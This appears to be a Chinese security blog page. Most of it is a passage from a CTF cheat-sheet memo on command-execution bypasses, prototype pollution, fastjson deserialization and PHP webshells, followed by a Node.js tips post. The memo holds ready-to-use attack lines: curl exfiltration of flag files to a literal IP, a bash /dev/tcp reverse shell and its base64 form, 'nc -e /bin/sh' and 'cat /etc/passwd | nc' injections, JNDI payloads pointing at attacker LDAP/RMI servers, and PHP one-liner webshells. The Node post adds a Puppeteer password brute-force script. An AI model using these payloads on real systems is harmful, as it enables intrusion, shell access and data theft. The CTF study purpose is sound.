<li><p>phar://<br><img src="http://static.zybuluo.com/1160307775/7xr0kz01z7zheao17t65uhdq/image_1d83liset16qc1k5e1bva4j3a7f1t.png" alt="image_1d83liset16qc1k5e1bva4j3a7f1t.png-107.3kB"></p>
</li>
</ul>
<h1 id="命令执行类"><a href="#命令执行类" class="headerlink" title="命令执行类"></a>命令执行类</h1><h2 id="常识-2"><a href="#常识-2" class="headerlink" title="常识"></a>常识</h2><p>获取flag文件并用Curl协议外带到自己的vps</p>
<pre><code>curl &#39;http://50.16.48.95/&#39; data &quot;`cat+/flag.txt`&quot;</code></pre><pre><code>curl -T ./flag.txt http://50.16.48.95/</code></pre><h2 id="命令执行Bypass"><a href="#命令执行Bypass" class="headerlink" title="命令执行Bypass"></a>命令执行Bypass</h2><h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p><img src="http://static.zybuluo.com/1160307775/s3yk12vptcnavyiki9wxfi51/image_1dpcjfim7tn1jc6eo7vsdr6i9.png" alt="image_1dpcjfim7tn1jc6eo7vsdr6i9.png-92.2kB"></p>
<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><pre><code>ca\t /f\lag</code></pre><h3 id="双引号-amp-分号–复杂变量"><a href="#双引号-amp-分号–复杂变量" class="headerlink" title="双引号&amp;分号–复杂变量"></a>双引号&amp;分号–复杂变量</h3><p>PHP复杂变量：<a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">https://xz.aliyun.com/t/4785</a></p>
<pre><code>${system(whoami)}</code></pre><p><img src="http://static.zybuluo.com/1160307775/ze8sakz6ijx1zx262kicbqnj/image_1dcp3bus82rs1ugp15ij1l75121e9.png" alt="image_1dcp3bus82rs1ugp15ij1l75121e9.png-79.6kB"></p>
<h3 id="单参数过滤-用http头传参绕过"><a href="#单参数过滤-用http头传参绕过" class="headerlink" title="单参数过滤-用http头传参绕过"></a>单参数过滤-用http头传参绕过</h3><p>nginx、apache中都可以用get_defined_vars()，但是apche还可以用getallheaders()</p>
<pre><code>eval(next(current(get_defined_vars())));&amp;b=var_dump(file_get_contents(&#39;/flag&#39;));</code></pre><p>还可以对session进行操作来绕过检测</p>
<pre><code>eval(hex2bin(session_id(session_start())));

PHPSESSID=7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b</code></pre><h1 id="hash长度拓展"><a href="#hash长度拓展" class="headerlink" title="hash长度拓展"></a>hash长度拓展</h1><p>已知md5($key.xxx)的一个值，还知道$key的长度，就可以构造任意md5($key.xxx)</p>
<h1 id="Javascript原型链污染"><a href="#Javascript原型链污染" class="headerlink" title="Javascript原型链污染"></a>Javascript原型链污染</h1><h2 id="骚操作-preventExtensions绕过"><a href="#骚操作-preventExtensions绕过" class="headerlink" title="骚操作-preventExtensions绕过"></a>骚操作-preventExtensions绕过</h2><p><img src="http://static.zybuluo.com/1160307775/rlrzawswdkm43aim2nqvqfyj/image_1drfesanc17521a6ipu112avoua9.png" alt="image_1drfesanc17521a6ipu112avoua9.png-159.7kB"></p>
<h2 id="Javascript原型链知识"><a href="#Javascript原型链知识" class="headerlink" title="Javascript原型链知识"></a>Javascript原型链知识</h2><p>实例对象的 __proto__与创建该实例对象的构造函数的 prototype 是相等的</p>
<pre><code>function Cat() {
    this.color = &#39;orange&#39;
}

var cat = new Cat()

console.log(cat.__proto__ === Cat.prototype)   // true</code></pre><p><img src="http://static.zybuluo.com/1160307775/49tkdxytis065nq33e4ah64d/image_1dma6rinf3k4lvv13cfj0l15fo9.png" alt="image_1dma6rinf3k4lvv13cfj0l15fo9.png-53.4kB"></p>
<p>在 JavaScript 中，如果想访问某个属性，首先会在实例对象（cat）的内部寻找，如果没找到，就会在该对象的原型（cat.__proto__，即 Cat.prototype）上找，我们知道，对象的原型也是对象，它也有原型，如果在对象的原型上也没有找到目标属性，则会在对象的原型的原型（Cat.prototype.__proto__）上寻找，以此内推，直到找到这个属性或者到达了最顶层。在原型上一层一层寻找，这便就是原型链了。</p>
<p>实例对象原型的原型是Object.prototype，而它的原型是null，null 没有原型，所以 Object.prototype 就是原型链的最顶端。</p>
<h3 id="constructor-构造函数"><a href="#constructor-构造函数" class="headerlink" title="constructor-构造函数"></a>constructor-构造函数</h3><p>javascript需要有一个像经典语言那样的能够创建对象模板的方法，可以根据模板自动化的创建我们需要的对象。JavaScript 用一种称为构建函数的特殊函数来定义对象和它们的特征。构建函数提供了创建您所需对象（实例）的有效方法，将对象的数据和特征函数按需联结至相应对象</p>
<p>一个例子如下：</p>
<pre><code>function Person(name) {
  this.name = name;
  this.greeting = function() {
    alert(&#39;Hi! I\&#39;m &#39; + this.name + &#39;.&#39;);
  };
}</code></pre><p>这个构建函数是 JavaScript 版本的类，这里使用了this关键词，指向这个构建函数创建的示例自身，而非指向构建函数(这跟其他面向对象语言中的this的含义一样)</p>
<p><strong>一个构建函数通常是大写字母开头，这样便于区分构建函数和普通函数</strong></p>
<p>每一个数据类型都有一个属性叫做<code>constructor</code>，指的就是自身的构造函数</p>
<p><img src="http://static.zybuluo.com/1160307775/vwwtw14kpni8i6mel7knng1w/image_1dtbe0q5qtkp1rldgr413l11a159.png" alt="image_1dtbe0q5qtkp1rldgr413l11a159.png-10.3kB">。</p>
<h3 id="prototype-原型"><a href="#prototype-原型" class="headerlink" title="prototype-原型"></a>prototype-原型</h3><p>可以把<code>prototype</code>看作<strong>类/方法/各种原始数据类型</strong>(这里统称为A)中的一个<strong>属性(画重点)</strong>，而所有用<strong>A类/方法/各种原始数据类型</strong>，得到的实例化的对象，都将拥有这个属性(prototype)中的所有内容</p>
<p>对于Object/Arrary/Function这三类数据类型来说，都有自己最原始的prototype。</p>
<p><img src="http://static.zybuluo.com/1160307775/nf076lg3f4rk6w8ugfbfozid/image_1dtbcvmil4nv6me1ndtgo21miap.png" alt="image_1dtbcvmil4nv6me1ndtgo21miap.png-709.6kB"></p>
<p>而所有的数据类型，最终的原型(prototype)都是Object.prototype，你也可以理解为数组/函数/xxx/这些数据类型都继承自类的原型，类是爸爸级别的。</p>
<pre><code>Array/Function.prototype.__proto__ == Object.prototype
&gt;true</code></pre><h3 id="proto"><a href="#proto" class="headerlink" title="proto"></a>proto</h3><p>这个就很简单了，每个数据类型里都有一个<code>__proto__</code>属性，指向自己的原型<code>prototype</code></p>
<h2 id="污染思路"><a href="#污染思路" class="headerlink" title="污染思路"></a>污染思路</h2><p>大部分原型链污染的题目就是利用某个对象的__proto__去向上指定原型，一直找到<code>Object</code>，一旦可以污染到<code>Object</code>的xxx属性，就可以修改任何对象的xxx属性。</p>
<p>如果是一个已经被定义的变量，它无法被原型链污染。</p>
<p>这里举一个Array.prototype被污染的情况如下：<br><img src="http://static.zybuluo.com/1160307775/mbmemb110lhvmtd9gh6kxe8f/image_1dma76hhhtag18hj2ku1s43st3m.png" alt="image_1dma76hhhtag18hj2ku1s43st3m.png-28.6kB"></p>
<h3 id="loadsh库-lt-4-17-5的污染"><a href="#loadsh库-lt-4-17-5的污染" class="headerlink" title="loadsh库&lt;4.17.5的污染"></a>loadsh库&lt;4.17.5的污染</h3><p>payload如下</p>
<pre><code>const mergeFn = require(&#39;lodash&#39;).defaultsDeep;
const payload = &#39;{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;a0&quot;: true}}}&#39;

function check() {
    mergeFn({}, JSON.parse(payload));
    if (({})[&#39;a0&#39;] === true) {
        console.log(`Vulnerable to Prototype Pollution via ${payload}`);
    }
  }

check();</code></pre><p>这个payload就相当于污染了Object.prototype.a0属性<br><img src="http://static.zybuluo.com/1160307775/yw8yzubquiat16kuza8uso6s/image_1dtben43n1ab92ab1bml19k1hvlm.png" alt="image_1dtben43n1ab92ab1bml19k1hvlm.png-21.9kB"></p>
<h3 id="JQuery-extend"><a href="#JQuery-extend" class="headerlink" title="JQuery-$.extend()"></a>JQuery-$.extend()</h3><p>JQuery 是一个非常流行的Js前端工具库，而它也存在原型链污染漏洞，CVE：CVE-2019-11358， 版本小于3.4.0时</p>
<p><img src="http://static.zybuluo.com/1160307775/ey9p1cv9e48igzla24c4odu8/image_1dtbf900dc9g109k1iev8ebfm41j.png" alt="image_1dtbf900dc9g109k1iev8ebfm41j.png-11.6kB"></p>
<p>可以看到，<code>$.extend(true,{},JSON.parse(&#39;{&quot;__proto__&quot;:{&quot;aa&quot;:&quot;hello&quot;}}&#39;))</code> Jquery可以用$.extend将两个字典merge，而这也因此污染了原型链。</p>
<h3 id="ejs和jade的RCE"><a href="#ejs和jade的RCE" class="headerlink" title="ejs和jade的RCE"></a>ejs和jade的RCE</h3><p>都是在exports.compile，即编译模版时候产生的代码注入</p>
<p>以jade模版为例，首先通过parse()函数获取一个变量作为函数内容，之后呢把它赋值到fn中，通过建立一个构造方法<code>Function</code>把fn数组重新赋值为一个新的函数体<code>fn</code>，之后调用return fn来动态执行原来fn中的字符串(相当于一个编译过程)</p>
<p>所以只要fn中存在恶意代码就可以在创建构造函数的时候把代码执行了<br><img src="http://static.zybuluo.com/1160307775/hk916tks6fy0dqn1p88pm6ne/image_1dtbhnc4t1eju1pi875c16a3d5d20.png" alt="image_1dtbhnc4t1eju1pi875c16a3d5d20.png-217.7kB"></p>
<p>所以跟进parse找污染点。一步一步入栈，栈的最深处visit函数存在原型链污染点，line默认未定义，只要污染line为:<code>));global.process.mainModule.require(&#39;child_process&#39;).execSy
nc(&#39;nc vps -e /bin/sh&#39;);//</code>即可</p>
<p><img src="http://static.zybuluo.com/1160307775/ncrd9wo2aqnra2b1jkn6swfn/image_1dtbhutuu7ug14iog7t12b6hh32t.png" alt="image_1dtbhutuu7ug14iog7t12b6hh32t.png-119.9kB"></p>
<p>关于ejs的RCE+污染点分析，见：</p>
<p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/" target="_blank" rel="noopener">Express+lodash+ejs: 从原型链污染到RCE</a></p>
<p><a href="https://xz.aliyun.com/t/6113" target="_blank" rel="noopener">XNUCA2019 Hardjs题解 从原型链污染到RCE</a></p>
<h3 id="不需要原型链污染的ejs-rce"><a href="#不需要原型链污染的ejs-rce" class="headerlink" title="不需要原型链污染的ejs-rce"></a>不需要原型链污染的ejs-rce</h3><p>前提是将<code>req.body</code>作为ejs渲染的参数，因为express存在hpp，所以这样就相当于污染了<code>options</code>，从而污染一个<code>options.settings</code>，这样就不需要原型链。。不过一般没有那个sb会这样写ejs的渲染出了ctfer</p>
<p><img src="http://static.zybuluo.com/1160307775/t0d100moorci4vyxni1b1xyy/image_1dvm51g2cbdhepm121j1jl1eoj3p.png" alt="image_1dvm51g2cbdhepm121j1jl1eoj3p.png-15.4kB"></p>
<p>详情见国外的一道ctf：<a href="https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2019-Quals/echo" target="_blank" rel="noopener">https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2019-Quals/echo</a></p>
<h2 id="express框架"><a href="#express框架" class="headerlink" title="express框架"></a>express框架</h2><p>express框架存在hpp，也就是说传入这样的参数</p>
<pre><code>aa[name]=hpdoger</code></pre><p>会被解析成为对象<code>{aa:{name:&quot;hpdoger&quot;}}</code>，这是因为express原生处理请求使用的是qs模块，而qs模块不存在原型链污染的问题，所以不能污染_<em>proto_</em></p>
<h1 id="Javaweb"><a href="#Javaweb" class="headerlink" title="Javaweb"></a>Javaweb</h1><h2 id="反弹SHELL"><a href="#反弹SHELL" class="headerlink" title="反弹SHELL"></a>反弹SHELL</h2><p>Runtime.getRuntime().exec()是Java中执行系统命令的方法，该接口中不能使用管道符等bash需要的方法，需要对bash进行一次编码：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a>  </p>
<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8888 0&gt;&amp;1  </p>
<p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}</p>
<h2 id="fastjson攻击"><a href="#fastjson攻击" class="headerlink" title="fastjson攻击"></a>fastjson攻击</h2><p>看这个，原理分析的很到位:<a href="https://curz0n.github.io/2019/09/24/fastjson_1_2_61_blacklist_bypass/" target="_blank" rel="noopener">fastjson 1.2.61远程代码执行漏洞分析&amp;复现</a></p>
<p>具体的一个例子参见空指针wp:<a href="https://mp.weixin.qq.com/s?__biz=MzU4MTg1NzAzMA==&mid=2247483796&idx=1&sn=ce4249ba61d7f402a1211e508f83d2b4&chksm=fd407bfdca37f2ebd51202f8221d320ccd639fd48d6a2adcb53c17ccb143fc3f037e6198662a&mpshare=1&scene=23&srcid=&sharer_sharetime=1577970121763&sharer_shareid=b6a93c2ad862a6198898de9305c515e1#rd" target="_blank" rel="noopener">空指针-treasure-Writeup</a></p>
<h3 id="攻击的两种方式"><a href="#攻击的两种方式" class="headerlink" title="攻击的两种方式"></a>攻击的两种方式</h3><p><strong>1、jdk低版本，允许加载远程恶意类</strong></p>
<p>攻击者在服务端用<a href="https://github.com/mbechler/marshalsec/tree/0471b932a09c8aca21876de80c8abf65b251c9ca" target="_blank" rel="noopener">marshalsec</a>起一个rmi/ldap的server，用来接收受害者请求并且转发到我们自己构造的http服务，下载&amp;加载恶意类(用来RCE的类)，例子在:<a href="https://www.restran.net/2018/10/29/fastjson-rce-notes/" target="_blank" rel="noopener">FastJson 反序列化漏洞利用笔记</a></p>
<p>然后发送一个fastjson的poc到我们的rmi/ldap server就行了<br><a href="https://github.com/jas502n/fastjson-1.2.61-RCE" target="_blank" rel="noopener">fastjson-1.2.61-RCE</a></p>
<p><strong>2、jdk高版本，需要找到另外库的反序列化链来用</strong></p>
<p>188以后的版本，不允许加载远程的恶意类，也就是说请求不到我们http-server下面放置的恶意类。此时有两种方法:</p>
<p>1.用ldap+本地gadget来bypass:<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">如何绕过高版本JDK的限制进行JNDI注入利用</a></p>
<p>2.用jrmp+rmi来bypass:攻击者用yso本地建立一个rmi-server，然后利用其他依赖的反序列化中继，具体用法见:<a href="https://mp.weixin.qq.com/s?__biz=MzU4MTg1NzAzMA==&mid=2247483796&idx=1&sn=ce4249ba61d7f402a1211e508f83d2b4&chksm=fd407bfdca37f2ebd51202f8221d320ccd639fd48d6a2adcb53c17ccb143fc3f037e6198662a&mpshare=1&scene=23&srcid=&sharer_sharetime=1577970121763&sharer_shareid=b6a93c2ad862a6198898de9305c515e1#rd" target="_blank" rel="noopener">空指针-treasure-Writeup</a><br><img src="http://static.zybuluo.com/1160307775/ozohcfzy5fh830z7oa86dlzn/image_1dtl011jf1tdlnpnvd9jmg1nvh2p.png" alt="image_1dtl011jf1tdlnpnvd9jmg1nvh2p.png-24.7kB"></p>
<h3 id="挖洞利用"><a href="#挖洞利用" class="headerlink" title="挖洞利用"></a>挖洞利用</h3><p>遇到传输格式是json的，就可以本地nc监听一个端口<code>1389</code>看有没有收到请求，用poc去打一下，推荐用1.2.61的poc去打，这个比较接近于最新版</p>
<pre><code>{&quot;@type&quot;:&quot;org.apache.commons.configuration2.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://120.79.152.66:1389/ExportObject&quot;}

{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://120.79.152.66:1389/Object&quot;,&quot;autoCommit&quot;:true}

{&quot;@type&quot;:&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, &quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://120.79.152.66:1389/inject.sql&#39;&quot;}</code></pre><h1 id="NodeJS相关"><a href="#NodeJS相关" class="headerlink" title="NodeJS相关"></a>NodeJS相关</h1><h2 id="快速启动express框架"><a href="#快速启动express框架" class="headerlink" title="快速启动express框架"></a>快速启动express框架</h2><p>全局安装express<code>npm install express -gd</code></p>
<p>直接用<code>express project</code>就能启动项目</p>
<p><img src="http://static.zybuluo.com/1160307775/ztst1w1ee9pg18twtl3kok8o/image_1dus0g9591jm238q1tgd14cu2cl9.png" alt="image_1dus0g9591jm238q1tgd14cu2cl9.png-435.1kB"></p>
<h2 id="npm所有第三方库漏洞"><a href="#npm所有第三方库漏洞" class="headerlink" title="npm所有第三方库漏洞"></a>npm所有第三方库漏洞</h2><p><a href="https://snyk.io/vuln/?type=npm" target="_blank" rel="noopener">https://snyk.io/vuln/?type=npm</a></p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h3><pre><code>&gt; var test = &#39;hpdoger&#39;;

&gt; var cookie = `aaa${test}`;

&gt; console.log(cookie);
aaahpdoger</code></pre><h2 id="url-parse绕过"><a href="#url-parse绕过" class="headerlink" title="url_parse绕过"></a>url_parse绕过</h2><p>对于白名单的绕过，又有新洞了，针对url_parse()函数:<a href="https://hackerone.com/reports/678487" target="_blank" rel="noopener">Hostname spoofing</a></p>
<h2 id="查看依赖的漏洞"><a href="#查看依赖的漏洞" class="headerlink" title="查看依赖的漏洞"></a>查看依赖的漏洞</h2><p>拿到一个nodejs项目的源码进行审计，第一步便是运行<code>npm audit</code> ，可以看到依赖项的漏洞情况。在项目的文件夹下直接运行<code>npm audit</code>就行了</p>
<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567017506/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.33.58_k7scsn.png" alt></p>
<h2 id="RCE语句"><a href="#RCE语句" class="headerlink" title="RCE语句"></a>RCE语句</h2><pre><code>require(&#39;child_process&#39;).exec(&#39;cat+/etc/passwd+|+nc+120.79.152.66+80&#39;)</code></pre><h2 id="nodemon-node的debug模式"><a href="#nodemon-node的debug模式" class="headerlink" title="nodemon-node的debug模式"></a>nodemon-node的debug模式</h2><h1 id="综合题型"><a href="#综合题型" class="headerlink" title="综合题型"></a>综合题型</h1><h2 id="http请求走私"><a href="#http请求走私" class="headerlink" title="http请求走私"></a>http请求走私</h2><p><img src="http://static.zybuluo.com/1160307775/bdyqii5y4vomhk0zdpv847nf/image_1dr102gapo981svc1e4f1s7qo509.png" alt="image_1dr102gapo981svc1e4f1s7qo509.png-379.6kB"></p>
<h2 id="jwt攻击"><a href="#jwt攻击" class="headerlink" title="jwt攻击"></a>jwt攻击</h2><p><a href="https://xz.aliyun.com/t/6776#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776#toc-8</a></p>
<h2 id="python-rce"><a href="#python-rce" class="headerlink" title="python-rce"></a>python-rce</h2><pre><code>eval(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></pre><h2 id="MYSQL读取客户端文件"><a href="#MYSQL读取客户端文件" class="headerlink" title="MYSQL读取客户端文件"></a>MYSQL读取客户端文件</h2><p>如果对方能够连接任意mysql用户，我们就可以伪造一个server去读取客户端的文件</p>
<p>Rogue-MySql-Server:<a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server</a></p>
<p>1、有一个更智能的脚本:<a href="https://github.com/lcark/MysqlClientAttack" target="_blank" rel="noopener">https://github.com/lcark/MysqlClientAttack</a></p>
<p>2、针对ctf的脚本:<a href="https://github.com/ev0A/Mysqlist" target="_blank" rel="noopener">https://github.com/ev0A/Mysqlist</a></p>
<h2 id="进程文件proc"><a href="#进程文件proc" class="headerlink" title="进程文件proc"></a>进程文件proc</h2><p>proc是一个文件夹，每个进程都代表一个文件夹</p>
<h3 id="常见的进程文件"><a href="#常见的进程文件" class="headerlink" title="常见的进程文件"></a>常见的进程文件</h3><pre><code>
/proc/self 链接到当前正在运行的进程

/proc/N/cwd 链接到进程当前工作目录

如果是通过小马执行的程序，那么当前进程就是apache，组合一下self/cwd:
proc/self/cwd/     =&gt;apache的工作目录

proc/pid/cmdline   =&gt;里面存储某个进程初始运行的命令,即启动时传递给kernel的参数信息</code></pre><h1 id="常见的过滤bypass"><a href="#常见的过滤bypass" class="headerlink" title="常见的过滤bypass"></a>常见的过滤bypass</h1><h2 id="php一句话"><a href="#php一句话" class="headerlink" title="php一句话"></a>php一句话</h2><h3 id="绕过尖括号"><a href="#绕过尖括号" class="headerlink" title="绕过尖括号"></a>绕过尖括号</h3><p>这种必须能修改.htaccess或者.user.ini文件，为每个文件包含一个php伪协议</p>
<p>利用方式:<a href="https://xz.aliyun.com/t/3937#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3937#toc-3</a></p>
<h3 id="绕过问号限制"><a href="#绕过问号限制" class="headerlink" title="绕过问号限制"></a>绕过问号限制</h3><p>php小于7.0的可以通过</p>
<pre><code>&lt;script language=&quot;PHP&quot;&gt;system($_GET[id])&lt;/script&gt;</code></pre><h3 id="绕过php标签限制"><a href="#绕过php标签限制" class="headerlink" title="绕过php标签限制"></a>绕过php标签限制</h3><p>或者使用短标签</p>
<pre><code>&lt;?=eval($_GET[1]);?&gt;</code></pre><h3 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数"></a>动态执行函数</h3><pre><code>1、没有过滤括号
$_GET[1]($_GET[0]);

2、过滤了括号的时候可以用大括号，但是php版本有要求，不过phpstudy没试出来
$_GET{1}($_GET{0});</code></pre><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="异或getshell"><a href="#异或getshell" class="headerlink" title="异或getshell"></a>异或getshell</h3><p><a href="https://xz.aliyun.com/t/5677" target="_blank" rel="noopener">一道题回顾php异或webshell</a></p>
<h3 id="取反getshell"><a href="#取反getshell" class="headerlink" title="取反getshell"></a>取反getshell</h3><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a></p>
<p><img src="http://static.zybuluo.com/1160307775/79i3ts2ckb7pt2sadlxjxts0/image_1dn25ak6j4qopumrdjtv8mic9.png" alt="image_1dn25ak6j4qopumrdjtv8mic9.png-117.8kB"></p>
<p>生成规则:</p>
<pre><code>var_dump(urlencode(~&#39;phpinfo&#39;));

=&gt;%8F%97%8F%96%91%99%90</code></pre>
                
            </div>
            <div class="continue">
            <a href="/2025/01/04/My CTF Memo(持续更新)/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2025/01/03/Node的一些应用技巧(持续更新)/"> 
                    Node的一些应用技巧(持续更新) 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2025-01-03   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端安全/">前端安全</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="Node的一些应用技巧-持续更新"><a href="#Node的一些应用技巧-持续更新" class="headerlink" title="Node的一些应用技巧(持续更新)"></a>Node的一些应用技巧(持续更新)</h1><p>一边学一边记吧..一些能用的到的</p>
<h2 id="puppeteer模拟登陆"><a href="#puppeteer模拟登陆" class="headerlink" title="puppeteer模拟登陆"></a>puppeteer模拟登陆</h2><p>对于表单加密，可以简单的用Pupputeer来模拟登陆，遇到前端加密的情况直接爆破密码。同样能够模拟爬虫，比webdriver要省事的多，而且支持document.queryselector，完全模拟浏览器操作</p>
<pre><code>const puppeteer = require(&#39;puppeteer&#39;);

async function autoLogin(url,username,password){
    const browser = await puppeteer.launch({
        args: [ &#39;--proxy-server=http://127.0.0.1:8080&#39; ],
        headless: false
    });
    const page = await browser.newPage();

    for(var i=0, len=password.length; i&lt;len; i++){
        pwd = password[i];
        await page.goto(url);
        await page.waitForSelector(&#39;#login&#39;);
        await page.type(&#39;#username&#39;, username,{ delay: 50 });
        await page.type(&#39;#password&#39;, pwd,{ delay: 50 });

        await page.click(&#39;#btn_click&#39;);

        await page.waitFor(200);
        let html = await page.content();
        if(html.indexOf(&#39;wrong&#39;) &lt; 1){
            break
        }
    }

    // const tokenVal = await page.$eval(&#39;#token&#39;, input =&gt; input.value);
    await browser.close();
    // console.log(&quot;[*]got token is:&quot;+tokenVal);

    page.on(&#39;error&#39;,(err)=&gt;{
        console.log(err)
    });
}

var username = &#39;admin&#39;;
var password = [&#39;password&#39;,&#39;root&#39;,&#39;sa&#39;,&#39;admin&#39;,&#39;admin123&#39;]

autoLogin(&#39;http://node.localhost.com/koa-demo/aes.html&#39;,username,password);</code></pre><h2 id="http发送请求"><a href="#http发送请求" class="headerlink" title="http发送请求"></a>http发送请求</h2><h3 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h3><p>对比python-request的优点在于不造成阻塞</p>
<pre><code>function getack(target){
    return new Promise((resolve,reject)=&gt;{
        let options = {
            url: target,
            headers: {
                &#39;User-Agent&#39;: &#39;request&#39;
            }
        };
        request.get(options, (error,response,body)=&gt;{
            if (!error &amp;&amp; response.statusCode == 200) { 
                resolve(body);
            }else{
                reject(error);
            }
        }).on(&#39;error&#39;, function(err) {
            rehect(err);
        }); 
    })

}

var target = &#39;http://server.com&#39;;

getack(target).then((body)=&gt;{
    console.log(body);
})</code></pre><h3 id="携带cookie请求"><a href="#携带cookie请求" class="headerlink" title="携带cookie请求"></a>携带cookie请求</h3><p>request默认不带cookie请求，需要启动jar，获取一个jar对象带入options中，同时对其进行setCookie操作</p>
<pre><code>const j = request.jar();
const cookie1 = request.cookie(&#39;username=admin&#39;);
const cookie2 = request.cookie(&#39;userid=123&#39;);
j.setCookie(cookie1, target);
j.setCookie(cookie2, target);

let options = {
    url: target,
    jar:j,
    headers: {
        &#39;User-Agent&#39;: &#39;request&#39;
    }
};

request.get(options, (error,response,body)=&gt;{
    if (!error &amp;&amp; response.statusCode == 200) { 
        resolve(body);
    }else{
        reject(error);
    }
}).on(&#39;error&#39;, function(err) {
    reject(err);
}); </code></pre><h3 id="Response内置属性-方法"><a href="#Response内置属性-方法" class="headerlink" title="Response内置属性/方法"></a>Response内置属性/方法</h3><p>查看http.ServerResponse类属性和方法:<a href="http://nodejs.cn/api/http.html#http_class_http_serverresponse" target="_blank" rel="noopener">http://nodejs.cn/api/http.html#http_class_http_serverresponse</a></p>
<h2 id="HTTP-Server"><a href="#HTTP-Server" class="headerlink" title="HTTP-Server"></a>HTTP-Server</h2><h3 id="快速搭建"><a href="#快速搭建" class="headerlink" title="快速搭建"></a>快速搭建</h3><p>Nodejs提供了内置的http-api，用来作为Server很方便，console出来便于收藏poc</p>
<pre><code>//server.js
var http=require(&quot;http&quot;);

http.createServer(function(req,res){
    res.writeHead(200,{
        &quot;content-type&quot;:&quot;text/plain&quot;
    });
    res.write(&quot;hello world&quot;);
    console.log(req.url)
    res.end();

}).listen(3000);

console.log(&quot;[*]server run on:http://127.0.0.1:3000&quot;)</code></pre><h3 id="设置Cookie"><a href="#设置Cookie" class="headerlink" title="设置Cookie"></a>设置Cookie</h3><p><code>req.headers.cookie</code>获取请求头的cookie。node中原生http通过setHeader设置cookie，<code>response.setHeader(name, value)</code>方法接收key,value键值对。</p>
<pre><code>http.createServer(function(req,res){
    username = &#39;admin&#39;
    userid = 1
    res.setHeader(&quot;Set-Cookie&quot;,[`username=${username}`,`userid=${userid}`]);
    res.writeHead(200,{
        &quot;content-type&quot;:&quot;text/plain&quot;
    });
    console.log(req.url);
    res.end(&#39;hello world&#39;);

}).listen(3000);</code></pre><p>当然也可以用JS-Cookie来操作cookie</p>
<h2 id="调试Express框架"><a href="#调试Express框架" class="headerlink" title="调试Express框架"></a>调试Express框架</h2><h3 id="调试已启动的Node程序"><a href="#调试已启动的Node程序" class="headerlink" title="调试已启动的Node程序"></a>调试已启动的Node程序</h3><p>在 launch.json 中作如下配置，VSCODE添加配置选项可自动添加</p>
<pre><code>{
    // 使用 IntelliSense 了解相关属性。 
    // 悬停以查看现有属性的描述。
    // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387
    &quot;version&quot;: &quot;0.2.0&quot;,
    &quot;configurations&quot;: [
        {
            &quot;type&quot;: &quot;node&quot;,
            &quot;request&quot;: &quot;attach&quot;,
            &quot;name&quot;: &quot;Attach by Process ID&quot;,
            &quot;processId&quot;: &quot;${command:PickProcess}&quot;,
            &quot;skipFiles&quot;: [
                &quot;&lt;node_internals&gt;/**&quot;
            ]
        }
    ]
}</code></pre><p>启动调试之后会让你选择存在的进程号来指定调试程序<br><img src="http://static.zybuluo.com/1160307775/s15ml8tunt28esr8pao6rhfe/image_1dtsvrmsu4ij1hjp1abliqe1nh2m.png" alt="image_1dtsvrmsu4ij1hjp1abliqe1nh2m.png-116.6kB"></p>
<h3 id="断点位置"><a href="#断点位置" class="headerlink" title="断点位置"></a>断点位置</h3><p>Express基于中间键，调试的时候很难找到入口。如果你跟中间键的话，它在加载框架时要加载一堆的中间键(query、inint、session、cookie)这些的很复杂。所以建议直接把断点打在路由中间件<code>Route</code>的dispatch方法上，因为dispacth就是分发路由，转到对应的实现方法<br><img src="http://static.zybuluo.com/1160307775/pyj1xnf4na3lvkmf4nj84hk2/image_1dtses96u3m212l3rk713h615lr9.png" alt="image_1dtses96u3m212l3rk713h615lr9.png-359.5kB"></p>
